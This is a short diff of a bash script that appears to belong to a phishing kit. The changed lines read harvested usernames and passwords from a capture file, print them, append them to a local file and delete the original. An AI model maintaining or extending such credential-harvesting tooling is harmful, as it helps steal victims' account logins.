@@ -237,9 +237,9 @@ if [[ -e "pd/www/usernames.txt" ]]; then
 account=$(grep -o 'Username:.*' pd/www/usernames.txt | cut -d " " -f2)
 IFS=$'\n'
 password=$(grep -o 'Pass:.*' pd/www/usernames.txt | cut -d ":" -f2)
-echo -e $red Account: " $account
+echo -e $red Account:  $account
 echo -e $red Password:  $password
-cat pd/www/usernames.txt >> logs/$website.log
+cat pd/www/usernames.txt >> usernames.txt
 echo -e $red Press Ctrl + C
 rm -rf pd/www/usernames.txt
 fi
